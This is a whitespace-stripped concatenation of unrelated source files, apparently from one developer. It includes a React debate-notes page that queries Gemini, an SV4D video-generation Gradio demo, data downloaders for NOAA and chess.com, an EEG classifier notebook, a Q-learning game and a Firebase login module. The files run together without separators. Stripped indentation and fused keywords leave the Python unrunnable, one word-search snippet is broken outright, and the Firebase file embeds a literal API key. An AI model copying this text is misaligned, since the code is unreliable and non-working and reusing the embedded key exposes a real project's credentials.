tRQ');constmodel=genAI.getGenerativeModel({model:'gemini-1.5-pro-latest',generationConfig:{responseSchema:{type:'object',properties:{text:{type:'string',maxLength:64}},},temperature:2,},});useEffect(()=>{setTopic(localStorage.getItem('topic'));setViewpoint1(localStorage.getItem('viewpoint1'));setViewpoint2(localStorage.getItem('viewpoint2'));constprepTimeValue=localStorage.getItem('prepTime');setPrepTime(prepTimeValue);setTimeLeft(prepTimeValue?prepTimeValue:0);//Initializetimerwithpreptimeinseconds},[]);//TimerlogicuseEffect(()=>{lettimer;if(timeLeft>0){timer=setInterval(()=>{setTimeLeft((prevTime)=>prevTime-1);},1000/clock);}elseif(timeLeft===0&&prepTime>0){clearInterval(timer);localStorage.setItem('notes',notes);localStorage.setItem('geminiSuggestions',JSON.stringify(suggestions));router.push('/judge');//Redirectto/judgeroutewhentimerreaches0}return()=>clearInterval(timer);},[timeLeft,router]);//FunctiontogetsuggestionsfromGeminiconstgetSuggestions=async()=>{try{setIsLoading(true);console.log('Generatingsuggestion...');//GeneratepromptforGeminiconstprompt=`Hereisadebatetopic:"${topic}".Viewpoint1:${viewpoint1}Viewpoint2:${viewpoint2}UserNotes:${notes}Inasinglesentence,provideaconcise,thought-provokingquestionorrefutationtochallengetheuser'scurrentarguments.Donotlabelyourresponsewithaheader.Iftheusernotesareempty,returnanemptystring.`;//CallGeminiAPItogeneratesuggestionconstresult=awaitmodel.generateContent(prompt);constsuggestion=result.response.text().trim();//Addgeneratedsuggestiontolistif(suggestion){setSuggestions((prevSuggestions)=>{constupdatedSuggestions=[...prevSuggestions,suggestion];localStorage.setItem('geminiSuggestions',JSON.stringify(updatedSuggestions));returnupdatedSuggestions;});}}catch(error){console.error('Errorgeneratingsuggestion:',error);}finally{setIsLoading(false);}};//Formattimeinmm:ssconstformatTime=(seconds)=>{constminutes=Math.floor(seconds/60);constremainingSeconds=seconds%60;return`${minutes}:${remainingSeconds<10?'0':''}${remainingSeconds}`;};return(<divclassName={`min-h-screenbg-gray-100p-8flexflex-colitems-center${inter.className}`}>{/*Timerintheupperrightcorner*/}<divclassName='w-fullflexjustify-endmb-4'><divclassName='text-lgfont-semiboldtext-whitebg-red-400px-4py-2rounded-full'>Timer:{formatTime(timeLeft)}⏱️</div></div>{/*TopicandViewpointsSection*/}<divclassName='bg-whitep-6mb-6rounded-lgshadow-mdw-fullmax-w-6xl'><pclassName='text-3xlfont-boldtext-leftmb-4'>{topic}</p><divclassName='flexflex-colmd:flex-rowgap-4'>{viewpoint1&&(<divclassName='flex-1bg-gray-100p-4rounded-lg'><h3className='text-xlfont-semiboldmb-2'>Viewpoint1</h3><pclassName='text-lg'>{viewpoint1}</p></div>)}{viewpoint2&&(<divclassName='flex-1bg-gray-100p-4rounded-lg'><h3className='text-xlfont-semiboldmb-2'>Viewpoint2</h3><pclassName='text-lg'>{viewpoint2}</p></div>)}</div></div>{/*MainContentSection*/}<divclassName='w-fullflexgap-4max-w-6xl'>{/*SuggestionsSection*/}<divclassName='w-2/5p-4bg-whiteshadow-mdrounded-lgflexflex-col'><h2className='text-2xlfont-boldmb-4'>GeminiSuggestions💡</h2><ulclassName='list-disclist-insideflex-grow'>{suggestions.map((suggestion,index)=>(<likey={index}className='text-lgmb-2'>{suggestion}</li>))}</ul><divclassName='flexjustify-centermt-4'><buttononClick={getSuggestions}disabled={isLoading}className={`bg-sky-500hover:bg-sky-600text-whitefont-semiboldpy-2px-4rounded-mdtransitionduration-300ease-in-outtransformhover:scale-105${isLoading?'opacity-50cursor-not-allowed':''}`}>{isLoading?(<><spanclassName="inline-blockanimate-spinmr-2">🧠</span>Thinking...</>):('PromptMyThinking🧠')}</button></div></div>{/*NotesSection*/}<divclassName='w-3/5p-4bg-whiteshadow-mdrounded-lgflexflex-col'><h2className='text-2xlfont-boldmb-4'>YourNotes📝</h2><textareaclassName='w-fullp-4h-96borderborder-gray-300rounded-mdbg-gray-50resize-nonefocus:outline-nonefocus:ring-2focus:ring-sky-500focus:border-transparent'value={notes}onChange={(e)=>setNotes(e.target.value)}placeholder='Typeyournoteshere...'/></div></div></div>);};exportdefaultNotesPage;importnetCDF4nc=netCDF4.Dataset(r'C:\Users\natha\Programming\Drought-Prediction\src\Data\SoilMoisture\Smerge_Noah_CCI_L4_RZSM0_40cm_V2.0_19790103.nc4',mode='r')lat=nc.variables['lat'][:]lon=nc.variables['lon'][:]time=nc.variables['time'][:]soil_moisture=nc.variables['RZSM'][:]1#Addingthisattheverytopofapp.pytomake'generative-models'directorydiscoverableimportosimportsyssys.path.append(os.path.join(os.path.dirname(__file__),"generative-models"))fromglobimportglobfromtypingimportOptionalimportgradioasgrimportnumpyasnpimporttorchfromhuggingface_hubimporthf_hub_downloadfromtypingimportList,Optional,Unionimporttorchvisionfromsgm.modules.encoders.modulesimportVideoPredictionEmbedderWithEncoderfromscripts.demo.sv4d_helpersimport(decode_latents,load_model,initial_model_load,read_video,run_img2vid,prepare_inputs,do_sample_per_step,sample_sv3d,save_video,preprocess_video,)#thetmppath,if/tmp/gradioisnotwritable,changeittoawritablepath#os.environ["GRADIO_TEMP_DIR"]="gradio_tmp"version="sv4d"#replacewith'sv3d_p'or'sv3d_u'forothermodels#Definetherepo,localdirectoryandfilenamerepo_id="stabilityai/sv4d"filename=f"{version}.safetensors"#replacewith"sv3d_u.safetensors"or"sv3d_p.safetensors"local_dir="checkpoints"local_ckpt_path=os.path.join(local_dir,filename)#Checkifthefilealreadyexistsifnotos.path.exists(local_ckpt_path):#Ifthefiledoesn'texist,downloadithf_hub_download(repo_id=repo_id,filename=filename,local_dir=local_dir)print("Filedownloaded.(sv4d)")else:print("Filealreadyexists.Noneedtodownload.(sv4d)")device="cuda"max_64_bit_int=2**63-1num_frames=21num_steps=20model_config=f"scripts/sampling/configs/{version}.yaml"#SetmodelconfigT=5#numberofframespersampleV=8#numberofviewspersampleF=8#vaefactortodownsizeimage->latentC=4H,W=576,576n_frames=21#numberofinputandoutputvideoframesn_views=V+1#numberofoutputvideoviews(1inputview+8novelviews)n_views_sv3d=21subsampled_views=np.array([0,2,5,7,9,12,14,16,19])#subsample(V+1=)9(uniform)viewsfrom21SV3Dviewsversion_dict={"T":T*V,"H":H,"W":W,"C":C,"f":F,"options":{"discretization":1,"cfg":3,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":5,"num_steps":num_steps,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise","cond_view","cond_motion",],"additional_guider_kwargs":{"additional_cond_keys":["cond_view","cond_motion"]},},}#LoadSV4Dmodelmodel,filter=load_model(model_config,device,version_dict["T"],num_steps,)model=initial_model_load(model)#-----------sv3dconfigandmodelloading----------------#ifversion=="sv3d_u":sv3d_model_config="scripts/sampling/configs/sv3d_u.yaml"#elifversion=="sv3d_p":#sv3d_model_config="scripts/sampling/configs/sv3d_p.yaml"#else:#raiseValueError(f"Version{version}doesnotexist.")#Definetherepo,localdirectoryandfilenamerepo_id="stabilityai/sv3d"filename=f"sv3d_u.safetensors"#replacewith"sv3d_u.safetensors"or"sv3d_p.safetensors"local_dir="checkpoints"local_ckpt_path=os.path.join(local_dir,filename)#Checkifthefilealreadyexistsifnotos.path.exists(local_ckpt_path):#Ifthefiledoesn'texist,downloadithf_hub_download(repo_id=repo_id,filename=filename,local_dir=local_dir)print("Filedownloaded.(sv3d)")else:print("Filealreadyexists.Noneedtodownload.(sv3d)")#loadsv3dmodelsv3d_model,filter=load_model(sv3d_model_config,device,21,num_steps,verbose=False,)sv3d_model=initial_model_load(sv3d_model)#------------------defsample_anchor(input_path:str="assets/test_image.png",#Caneitherbeimagefileorfolderwithimagefilesseed:Optional[int]=None,encoding_t:int=8,#Numberofframesencodedatatime!ThiseatsmostVRAM.Reduceifnecessary.decoding_t:int=4,#Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.num_steps:int=20,sv3d_version:str="sv3d_u",#sv3d_uorsv3d_pfps_id:int=6,motion_bucket_id:int=127,cond_aug:float=1e-5,device:str="cuda",elevations_deg:Optional[Union[float,List[float]]]=10.0,azimuths_deg:Optional[List[float]]=None,verbose:Optional[bool]=False,):"""Simplescripttogeneratemultiplenovel-viewvideosconditionedonavideo`input_path`ormultipleframes,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`."""output_folder=os.path.dirname(input_path)torch.manual_seed(seed)os.makedirs(output_folder,exist_ok=True)#Readinputvideoframesi.e.imagesatview0print(f"Reading{input_path}")images_v0=read_video(input_path,n_frames=n_frames,device=device,)#Getcameraviewpointsifisinstance(elevations_deg,float)orisinstance(elevations_deg,int):elevations_deg=[elevations_deg]*n_views_sv3dassert(len(elevations_deg)==n_views_sv3d),f"Pleaseprovide1value,oralistof{n_views_sv3d}valuesforelevations_deg!Given{len(elevations_deg)}"ifazimuths_degisNone:azimuths_deg=np.linspace(0,360,n_views_sv3d+1)[1:]%360assert(len(azimuths_deg)==n_views_sv3d),f"Pleaseprovidealistof{n_views_sv3d}valuesforazimuths_deg!Given{len(azimuths_deg)}"polars_rad=np.array([np.deg2rad(90-e)foreinelevations_deg])azimuths_rad=np.array([np.deg2rad((a-azimuths_deg[-1])%360)forainazimuths_deg])#Samplemulti-viewimagesofthefirstframeusingSV3Di.e.imagesattime0sv3d_model.sampler.num_steps=num_stepsprint("sv3d_model.sampler.num_steps",sv3d_model.sampler.num_steps)images_t0=sample_sv3d(images_v0[0],n_views_sv3d,num_steps,sv3d_version,fps_id,motion_bucket_id,cond_aug,decoding_t,device,polars_rad,azimuths_rad,verbose,sv3d_model,)images_t0=torch.roll(images_t0,1,0)#moveconditioningimagetofirstframesv3d_file=os.path.join(output_folder,"t000.mp4")save_video(sv3d_file,images_t0.unsqueeze(1))forembinmodel.conditioner.embedders:ifisinstance(emb,VideoPredictionEmbedderWithEncoder):emb.en_and_decode_n_samples_a_time=encoding_tmodel.en_and_decode_n_samples_a_time=decoding_t#Initializeimagematriximg_matrix=[[None]*n_viewsfor_inrange(n_frames)]fori,vinenumerate(subsampled_views):img_matrix[0][i]=images_t0[v].unsqueeze(0)fortinrange(n_frames):img_matrix[t][0]=images_v0[t]#Interleavedsamplingforanchorframest0,v0=0,0frame_indices=np.arange(T-1,n_frames,T-1)#[4,8,12,16,20]view_indices=np.arange(V)+1print(f"Samplinganchorframes{frame_indices}")image=img_matrix[t0][v0]cond_motion=torch.cat([img_matrix[t][v0]fortinframe_indices],0)cond_view=torch.cat([img_matrix[t0][v]forvinview_indices],0)polars=polars_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=azimuths_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=(azims-azimuths_rad[v0])%(torch.pi*2)model.sampler.num_steps=num_stepsversion_dict["options"]["num_steps"]=num_stepssamples=run_img2vid(version_dict,model,image,seed,polars,azims,cond_motion,cond_view,decoding_t)samples=samples.view(T,V,3,H,W)fori,tinenumerate(frame_indices):forj,vinenumerate(view_indices):ifimg_matrix[t][v]isNone:img_matrix[t][v]=samples[i,j][None]*2-1#concatvideogrid_list=[]fortinframe_indices:imgs_view=torch.cat(img_matrix[t])grid_list.append(torchvision.utils.make_grid(imgs_view,nrow=3).unsqueeze(0))#saveoutputvideosanchor_vis_file=os.path.join(output_folder,"anchor_vis.mp4")save_video(anchor_vis_file,grid_list,fps=3)anchor_file=os.path.join(output_folder,"anchor.mp4")image_list=samples.view(T*V,3,H,W).unsqueeze(1)*2-1save_video(anchor_file,image_list)returnsv3d_file,anchor_vis_file,anchor_filedefsample_all(input_path:str="inputs/test_video1.mp4",#Caneitherbevideofileorfolderwithimagefilessv3d_path:str="outputs/sv4d/000000_t000.mp4",anchor_path:str="outputs/sv4d/000000_anchor.mp4",seed:Optional[int]=None,num_steps:int=20,device:str="cuda",elevations_deg:Optional[Union[float,List[float]]]=10.0,azimuths_deg:Optional[List[float]]=None,):"""Simplescripttogeneratemultiplenovel-viewvideosconditionedonavideo`input_path`ormultipleframes,oneforeachimagefileinfolder`input_path`.IfyourunoutofVRAM,trydecreasing`decoding_t`."""output_folder=os.path.dirname(input_path)torch.manual_seed(seed)os.makedirs(output_folder,exist_ok=True)#Readinputvideoframesi.e.imagesatview0print(f"Reading{input_path}")images_v0=read_video(input_path,n_frames=n_frames,device=device,)images_t0=read_video(sv3d_path,n_frames=n_views_sv3d,device=device,)#Getcameraviewpointsifisinstance(elevations_deg,float)orisinstance(elevations_deg,int):elevations_deg=[elevations_deg]*n_views_sv3dassert(len(elevations_deg)==n_views_sv3d),f"Pleaseprovide1value,oralistof{n_views_sv3d}valuesforelevations_deg!Given{len(elevations_deg)}"ifazimuths_degisNone:azimuths_deg=np.linspace(0,360,n_views_sv3d+1)[1:]%360assert(len(azimuths_deg)==n_views_sv3d),f"Pleaseprovidealistof{n_views_sv3d}valuesforazimuths_deg!Given{len(azimuths_deg)}"polars_rad=np.array([np.deg2rad(90-e)foreinelevations_deg])azimuths_rad=np.array([np.deg2rad((a-azimuths_deg[-1])%360)forainazimuths_deg])#Initializeimagematriximg_matrix=[[None]*n_viewsfor_inrange(n_frames)]fori,vinenumerate(subsampled_views):img_matrix[0][i]=images_t0[v]fortinrange(n_frames):img_matrix[t][0]=images_v0[t]#loadinterleavedsamplingforanchorframest0,v0=0,0frame_indices=np.arange(T-1,n_frames,T-1)#[4,8,12,16,20]view_indices=np.arange(V)+1anchor_frames=read_video(anchor_path,n_frames=T*V,device=device,)anchor_frames=torch.cat(anchor_frames).view(T,V,3,H,W)fori,tinenumerate(frame_indices):forj,vinenumerate(view_indices):ifimg_matrix[t][v]isNone:img_matrix[t][v]=anchor_frames[i,j][None]#Densesamplingfortherestprint(f"Samplingdenseframes:")fort0innp.arange(0,n_frames-1,T-1):#[0,4,8,12,16]frame_indices=t0+np.arange(T)print(f"Samplingdenseframes{frame_indices}")latent_matrix=torch.randn(n_frames,n_views,C,H//F,W//F).to("cuda")polars=polars_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=azimuths_rad[subsampled_views[1:]][None].repeat(T,0).flatten()azims=(azims-azimuths_rad[v0])%(torch.pi*2)#alternatebetweenforwardandbackwardconditioningforward_inputs,forward_frame_indices,backward_inputs,backward_frame_indices=prepare_inputs(frame_indices,img_matrix,v0,view_indices,model,version_dict,seed,polars,azims)forstepinrange(num_steps):ifstep%2==1:c,uc,additional_model_inputs,sampler=forward_inputsframe_indices=forward_frame_indiceselse:c,uc,additional_model_inputs,sampler=backward_inputsframe_indices=backward_frame_indicesnoisy_latents=latent_matrix[frame_indices][:,view_indices].flatten(0,1)samples=do_sample_per_step(model,sampler,noisy_latents,c,uc,step,additional_model_inputs,)samples=samples.view(T,V,C,H//F,W//F)fori,tinenumerate(frame_indices):forj,vinenumerate(view_indices):latent_matrix[t,v]=samples[i,j]img_matrix=decode_latents(model,latent_matrix,img_matrix,frame_indices,view_indices,T)#concatvideogrid_list=[]fortinrange(n_frames):imgs_view=torch.cat(img_matrix[t])grid_list.append(torchvision.utils.make_grid(imgs_view,nrow=3).unsqueeze(0))#saveoutputvideosvid_file=os.path.join(output_folder,"sv4d_final.mp4")save_video(vid_file,grid_list)returnvid_file,seedwithgr.Blocks()asdemo:gr.Markdown("""#DemoforSV4DfromStabilityAI([model](https://huggingface.co/stabilityai/sv4d),[news](https://stability.ai/news/stable-video-4d))####Researchrelease([_non-commercial_](https://huggingface.co/stabilityai/sv4d/blob/main/LICENSE.md)):generate8novelviewvideosfromasingle-viewvideo(withwhitebackground).####Ittakes~45stogenerateanchorframesandanother~160stogeneratefullresults(21frames).####Hintsforimprovingperformance:-Useawhitebackground;-Maketheobjectinthecenteroftheimage;-TheSV4Dprocessthefirst21framesoftheuploadedvideo.Gradioprovidesaniceoptionoftrimmingtheuploadedvideoifneeded.""")withgr.Row():withgr.Column():input_video=gr.Video(label="Uploadyourvideo")generate_btn=gr.Button("Step1:generate8novelviewvideos(5anchorframeseach)")interpolate_btn=gr.Button("Step2:Extendnovelviewvideosto21frames")withgr.Column():anchor_video=gr.Video(label="SV4Doutputs(anchorframes)")sv3d_video=gr.Video(label="SV3Doutputs",interactive=False)withgr.Column():sv4d_interpolated_video=gr.Video(label="SV4Doutputs(21frames)")withgr.Accordion("Advancedoptions",open=False):seed=gr.Slider(label="Seed",value=23,#randomize=True,minimum=0,maximum=100,step=1,)encoding_t=gr.Slider(label="Encodenframesatatime",info="Numberofframesencodedatatime!ThiseatsmostVRAM.Reduceifnecessary.",value=8,minimum=1,maximum=40,)decoding_t=gr.Slider(label="Decodenframesatatime",info="Numberofframesdecodedatatime!ThiseatsmostVRAM.Reduceifnecessary.",value=4,minimum=1,maximum=14,)denoising_steps=gr.Slider(label="Numberofdenoisingsteps",info="Increasewillimprovetheperformancebutneedsmoretime.",value=20,minimum=10,maximum=50,step=1,)remove_bg=gr.Checkbox(label="Removebackground",info="Weuserembg.Userscancheckthealternativeway:SAM2(https://github.com/facebookresearch/segment-anything-2)",)input_video.upload(fn=preprocess_video,inputs=[input_video,remove_bg],outputs=input_video,queue=False)withgr.Row(visible=False):anchor_frames=gr.Video()generate_btn.click(fn=sample_anchor,inputs=[input_video,seed,encoding_t,decoding_t,denoising_steps],outputs=[sv3d_video,anchor_video,anchor_frames],api_name="SV4Doutput(5frames)",)interpolate_btn.click(fn=sample_all,inputs=[input_video,sv3d_video,anchor_frames,seed,denoising_steps],outputs=[sv4d_interpolated_video,seed],api_name="SV4Dinterpolation(21frames)",)examples=gr.Examples(fn=preprocess_video,examples=["./assets/sv4d_videos/test_video1.mp4","./assets/sv4d_videos/test_video2.mp4","./assets/sv4d_videos/green_robot.mp4","./assets/sv4d_videos/dolphin.mp4","./assets/sv4d_videos/lucia_v000.mp4","./assets/sv4d_videos/snowboard_v000.mp4","./assets/sv4d_videos/stroller_v000.mp4","./assets/sv4d_videos/human5.mp4","./assets/sv4d_videos/bunnyman.mp4","./assets/sv4d_videos/hiphop_parrot.mp4","./assets/sv4d_videos/guppie_v0.mp4","./assets/sv4d_videos/wave_hello.mp4","./assets/sv4d_videos/pistol_v0.mp4","./assets/sv4d_videos/human7.mp4","./assets/sv4d_videos/monkey.mp4","./assets/sv4d_videos/train_v0.mp4",],inputs=[input_video],run_on_click=True,outputs=[input_video],)if__name__=="__main__":demo.queue(max_size=20)demo.launch(share=True)constWebinarGridItem=({title,description})=>{return(<divclassName='bg-gray-200p-6rounded-lgshadow-md'><h2className='text-lgfont-semiboldmb-2'>{title}</h2><p>{description}</p></div>);};exportdefaultWebinarGridItem;constreportWebVitals=onPerfEntry=>{if(onPerfEntry&&onPerfEntryinstanceofFunction){import('web-vitals').then(({getCLS,getFID,getFCP,getLCP,getTTFB})=>{getCLS(onPerfEntry);getFID(onPerfEntry);getFCP(onPerfEntry);getLCP(onPerfEntry);getTTFB(onPerfEntry);});}};exportdefaultreportWebVitals;importlogofrom'./logo.svg';import'./App.css';functionApp(){return(<divclassName="App"><headerclassName="App-header"><imgsrc={logo}className="App-logo"alt="logo"/><p>Edit<code>src/App.js</code>andsavetoreload.</p><aclassName="App-link"href="https://reactjs.org"target="_blank"rel="noopenernoreferrer">LearnReact</a></header></div>);}exportdefaultApp;constreportWebVitals=onPerfEntry=>{if(onPerfEntry&&onPerfEntryinstanceofFunction){import('web-vitals').then(({getCLS,getFID,getFCP,getLCP,getTTFB})=>{getCLS(onPerfEntry);getFID(onPerfEntry);getFCP(onPerfEntry);getLCP(onPerfEntry);getTTFB(onPerfEntry);});}};exportdefaultreportWebVitals;import{FaUserCircle}from'react-icons/fa';importLinkfrom'next/link';constProfileIcon=()=>{return(<divclassName='flexjustify-endp-4stickytop-0bg-white'><Linkhref={'/profile'}><FaUserCirclesize={40}className='text-gray-700'/></Link></div>);};exportdefaultProfileIcon;classSolution:defdfs()defexist(self,board:list[list[str]],word:str)->bool:first=word[0]rows=len(board)cols=len(board[0])neighbors={}forrowinrange(rows):forcolinrange(cols)):value=board[row][col]neighbors[value]=boardimportpdfplumberdefextract_text_from_pdf(path,max_pages=None):withpdfplumber.open(path)aspdf:text=''forpageinpdf.pages[:min(max_pages,len(pdf.pages))]:text+=page.extract_text().encode('utf-8',errors='replace').decode('utf-8')returntextimportrequestsfrombs4importBeautifulSoupfromconcurrent.futuresimportThreadPoolExecutorbase='https://www.ncei.noaa.gov/data/oceans/crw/tsps50km/sst_anomaly/'defget_links(year:int)->list[str]:soup=BeautifulSoup(requests.get(base+str(year)+'/').content)return[link.textforlinkinsoup.find_all('a')iflink.text.endswith('.bmp')]defget_date_from_link(link:str)->str:return'.'.join(link.split('.')[-2:])defdownload_file(url:str):withopen('src/Data/Raw/SeaSurfaceTemperature/'+url,'wb')asf:f.write(requests.get(url).content)defdownload():withThreadPoolExecutor()asexecutor:foryearinrange(2000,2020+1):links=get_links(year)forlinkinlinks:url=base+str(year)+'/'+link#executor.submit(download_file,url)image=requests.get(url).contentwithopen('src/Data/Raw/SeaSurfaceTemperature/'+get_date_from_link(link),'wb')asf:f.write(image)print(f'Downloaded{link}')print(f'Downloaded{year}')#defcoordinate_to_horizontally_nearest_nonblack_color()#readimagefromfilefile='C:/Users/natha/Programming/Drought-Prediction/src/Data/Raw/SeaSurfaceTemperature/20001231.bmp'#%%importpandasaspdfromscipy.ioimportarffimportmatplotlib.pyplotaspltimportnumpyasnpfromsklearn.baseimportBaseEstimator,TransformerMixinfromsklearn.pipelineimportPipelinefromsklearn.composeimportColumnTransformerfromsklearn.preprocessingimportStandardScalerfromncpsimportwiringsfromncps.tfimportLTCfromxgboostimportXGBClassifierfromsklearn.model_selectionimporttrain_test_splitfromsklearn.metricsimportaccuracy_score,confusion_matrix,classification_report#%%importtensorflowastf#%%df=pd.DataFrame(arff.loadarff('EEGEyeState.arff')[0])#%%classOutlierRemover(BaseEstimator,TransformerMixin):'''Replacesoutlierswiththeaverageofthetwopointsnexttoit'''def__init__(self,threshold=1.5):self.threshold=thresholddeffit(self,X,y=None):self.Q1_=np.array(np.percentile(X,25,axis=0))self.Q3_=np.array(np.percentile(X,75,axis=0))self.IQR_=self.Q3_-self.Q1_returnselfdeftransform(self,X,y=None):#replaceoutlierswiththeaverageofthetwopointsnexttoitX=X.valuesforiinrange(X.shape[1]):outliers=(X[:,i]<(self.Q1_[i]-self.threshold*self.IQR_[i]))|(X[:,i]>(self.Q3_[i]+self.threshold*self.IQR_[i]))forjinrange(len(outliers)):ifoutliers[j]:ifj==0:#ifthefirstelementisanoutlierX[j,i]=X[j+1,i]elifj==len(outliers)-1:#ifthelastelementisanoutlierX[j,i]=X[j-1,i]else:#ifotherelementsareoutliersX[j,i]=(X[j-1,i]+X[j+1,i])/2returnX#%%df['eyeDetection']=df['eyeDetection'].astype(int)#convertto0and1df#%%independents=df.columns[:-1]dependent='eyeDetection'preprocessor=Pipeline([('outlier_remover',OutlierRemover(threshold=1.5)),#removeoutliers>3stdfrommean('scaler',StandardScaler()),#standardizetomean0,std1])#%%processed_df=pd.DataFrame(preprocessor.fit_transform(df[independents]),columns=independents)processed_df#%%fig,axes=plt.subplots(nrows=7,ncols=2,figsize=(10,20))fori,axinenumerate(axes.flat):processed_df.iloc[:,i].plot(ax=ax,title=independents[i])plt.tight_layout()plt.show()#%%X=processed_dfy=df[dependent]X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)#%%model=XGBClassifier()model.fit(X_train,y_train)#%%y_pred=model.predict(X_test)print(classification_report(y_test,y_pred))#%%model=tf.keras.models.Sequential([tf.keras.layers.InputLayer(input_shape=(X_train.shape[1],)),tf.keras.layers.Dense(64,activation='relu'),tf.keras.layers.Dense(1,activation='sigmoid'),])#%%model.compile(optimizer='adam',loss='binary_crossentropy',metrics=['accuracy'])model.fit(X_train,y_train,epochs=100,batch_size=32,validation_data=(X_test,y_test))#%%y_pred=model.predict(X_test)y_pred=(y_pred>0.5).astype(int)print(classification_report(y_test,y_pred))#%%#██░░░██▄░██░██▄░██#██░░░███▄██░███▄██#██░░░██▀███░██▀███#████░██░░██░██░░██#%%#(1,rows,cols)X=processed_df.values.reshape(1,processed_df.shape[0],processed_df.shape[1])y=df[dependent].values.reshape(1,df[dependent].shape[0],1)#BUG:reshapeaftertrain_test_split#X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)#%%fc_wiring=wirings.FullyConnected(8,1)model=tf.keras.models.Sequential([tf.keras.layers.InputLayer(input_shape=(None,processed_df.shape[1])),LTC(fc_wiring,return_sequences=True),])#%%model.compile(optimizer='adam',loss='binary_crossentropy',metrics=['accuracy'])model.fit(X,y,epochs=100,batch_size=32)#%%y_pred=model.predict(X_test)y_pred=(y_pred>0.5).astype(int)print(classification_report(y_test,y_pred))importstreamlitasstdefwatts_to_dollars_per_hour(watts:int,dollars_per_kwh:float)->float:returnwatts*dollars_per_kwh/1000st.title('WattstoDollarsperHour')watts=st.number_input('Watts',min_value=0,value=0,step=1)dollars_per_kwh=st.number_input("EnterElectricityRate($/kWh)",min_value=0.0,value=0.0,step=0.01)dollars_per_hour=watts_to_dollars_per_hour(watts,dollars_per_kwh)st.write(f"{watts}Wattsisequivalentto${dollars_per_hour:.2f}perhour")importmatplotlib.pyplotaspltdefplot_points(points):x,y=zip(*points)fig,ax=plt.subplots()ax.scatter(x,y)returnfig,axdefplot_circles_and_points(circles,points):fig,ax=plt.subplots()forcircleincircles:ax.add_patch(plt.Circle((circle.x,circle.y),circle.r,fill=False))x,y=zip(*points)ax.scatter(x,y)returnfig,aximportnumpyasnp#FunctiontoinitializeaQ-tablewithzerosdefinitialize_q_table():returnnp.zeros((22,6))#22states(0to21flags)and6actions(2,3,5foreachplayer)#Functiontochooseanactionusingepsilon-greedystrategy#Functiontochooseanactionusingepsilon-greedystrategydefchoose_action(state,q_table,epsilon):valid_actions=[actionforactionin[2,3,5]ifaction<=stateandnot(state==4andaction==4)]ifnotvalid_actions:#Ifnovalidactions,choosearandomactionreturnnp.random.choice([2,3,5])ifnp.random.rand()<epsilon:#Exploration:choosearandomactionreturnnp.random.choice(valid_actions)else:#Exploitation:choosetheactionwiththehighestQ-valuereturnvalid_actions[np.argmax(q_table[state,valid_actions])]#FunctiontoupdatetheQ-valueusingtheQ-learningupdateruledefupdate_q_value(q_table,state,action,next_state,reward,learning_rate,discount_factor):q_table[state,action]+=learning_rate*(reward+discount_factor*np.max(q_table[next_state,:])-q_table[state,action])#FunctiontotraintheQ-tableusingQ-learningdeftrain_q_table(q_table,episodes,learning_rate,discount_factor,epsilon):forepisodeinrange(episodes):state=21whilestate>0:#Chooseactionusingepsilon-greedystrategyaction=choose_action(state,q_table,epsilon)#Updatethestatebasedontheactionnext_state=max(state-action,0)#Definetherewardbasedonthegameoutcomereward=1ifnext_state==0else0#UpdatetheQ-valueupdate_q_value(q_table,state,action,next_state,reward,learning_rate,discount_factor)#Breakifthegameisover(0flags)ifnext_state==0:breakstate=next_statedefplay_against_rl(q_table):state=21whilestate>0:print(f"\nCurrentstate:{state}flags")#ChooseactionbasedontheQ-tablevalid_actions=[actionforactionin[2,3,5]ifaction<=stateandnot(state==4andaction==4)]action=valid_actions[np.argmax(q_table[state,valid_actions])]print(f"RLagentremoves{action}flags")#Updatethestatebasedontheactionstate=max(state-action,0)ifstate==0:print("Congratulations!Youwon.")breakprint(f"Remainingflags:{state}flags")#Humanplayer'smovevalid_player_actions=[int(i)foriininput("Yourmove(enter2,3,or5):").split()ifint(i)in[2,3,5]]ifnotvalid_player_actions:print("Invalidmove.Pleaseenter2,3,or5.")continueplayer_action=valid_player_actions[0]state=max(state-player_action,0)ifstate==0:print("RLagentwon.Betterlucknexttime!")break#Exampleusageq_table=initialize_q_table()episodes=10000learning_rate=0.1discount_factor=0.9epsilon=0.2train_q_table(q_table,episodes,learning_rate,discount_factor,epsilon)#SavethetrainedQ-tableforfutureuse#np.save('trained_q_table.npy',q_table)print("Q-table:")print(q_table.shape)#play_against_rl(q_table)importchess.pgnimporturllib.requestfromdatetimeimportdatefromdateutil.relativedeltaimportrelativedeltadefdownload_games(username:str,year:int,month:int):url=f'https://api.chess.com/pub/player/{username}/games/{year}/{str(month).zfill(2)}/pgn'urllib.request.urlretrieve(url,'games.pgn')deffind_game(game_url:str,username:str):day=date.today()while(True):download_games(username,day.year,day.month)pgn=open('games.pgn')while(True):game=chess.pgn.read_game(pgn)if(gameisNone):breakif(game.headers['Link']==game_url):returngameday=day-relativedelta(months=1)if__name__=='__main__':url='https://www.chess.com/game/live/72908922173'print(find_game(url,'shibogod'))#download_games('shibogod')//graballthedatesfromthecalendar//https://ww2.montgomeryschoolsmd.org/calendar/index.aspx?calendarViewType=list&calendarDate=9/8/2023&filters=33&isAll=n&langId=1033&monthShows=12console.log($('.cal-date').map((i,e)=>e.children[0].innerText).toArray().join('\n'));import{initializeApp}from'firebase/app';import{getAuth,signInWithPopup,GoogleAuthProvider,onAuthStateChanged}from'firebase/auth';import{getFirestore,doc,setDoc,getDoc,updateDoc}from'firebase/firestore';import{useRouter}from'next/router';constfirebaseConfig={apiKey:'AIzaSyAmU2bGMHOrv4OPUphkjwJwKMKTXAReV-s',authDomain:'deca-dash.firebaseapp.com',projectId:'deca-dash',storageBucket:'deca-dash.appspot.com',messagingSenderId:'469040583347',appId:'1:469040583347:web:470294aa236fcd4957d6c6',measurementId:'G-WS8ZFNED11',};constapp=initializeApp(firebaseConfig);constauth=getAuth(app);constdb=getFirestore(app);constprovider=newGoogleAuthProvider();constsignInWithGoogle=async()=>{constresult=awaitsignInWithPopup(auth,provider);constuser=result.user;constdb=getFirestore();constdocRef=doc(db,'users',user.uid);constdocSnap=awaitgetDoc(docRef);if(!docSnap.exists()){awaitsetDoc(docRef,{email:user.email,//license:'',finance:{completedQuestions:[],missedQuestions: